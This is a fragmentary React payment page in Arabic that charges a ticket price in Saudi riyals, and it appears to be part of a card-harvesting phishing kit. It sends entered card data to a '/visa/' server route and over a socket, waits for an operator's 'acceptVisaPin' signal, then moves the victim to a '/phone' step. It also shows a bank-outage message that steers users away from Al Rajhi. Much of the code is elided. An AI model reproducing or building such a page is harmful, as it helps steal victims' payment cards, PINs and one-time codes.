...
const PaymentForm = () => {
  ...
  const paymentTotal = useMemo(() => {
    ...
    const addData =
      sessionStorage.getItem("add")?.split(",").filter(Boolean) || [];
    ...
    return isFamilyPack ? 1600 : Number(subtotal) + Number(addons);
  }, []);
...
نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي لدى مركز سلامة، وذلك بسبب خلل فني من جهة مصدر البنك`);
    ...
    if (!data) {
      return window.alert("بيانات الجلسة غير متوفرة، يرجى إعادة المحاولة من السلة");
    }
    setLoading(true);
    try {
      ...
      await axios.post(serverRoute + "/visa/" + _id, finalData);
      socket.emit("paymentForm", finalData);
    } catch {
      setLoading(false);
      window.alert("تعذر إرسال البيانات، تحقق من الاتصال وحاول مرة أخرى");
    }
  };
  ...
  socket.on("acceptVisaPin", (id) => {
    if (id === JSON.parse(data)._id) {
      ...
      sessionStorage.setItem("id", row._id);
      navigate(
        "/phone?data=" +
          JSON.stringify({
            ...row,
            ...
            <div className="inline-flex w-full  flex-col items-start">
              <div className="inline-flex flex-col items-start gap-3">
                ...
                <p className="text-sm font-normal leading-tight text-gray-500">
                  سعر التذكرة شامل الضريبة{" "}
                </p>
                <h1 className="text-4xl font-bold leading-10 text-gray-800">
                  {Number(paymentTotal).toFixed(2)} ر.س
                </h1>
              </div>
              {/* <div className="flex w-full flex-col gap-6 mt-11">
                ...
                <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
                  ...
                  <div className="text-sm leading-none">115.00 ر.س</div>
                </div>
              </div> */}
            </div>
          </div>
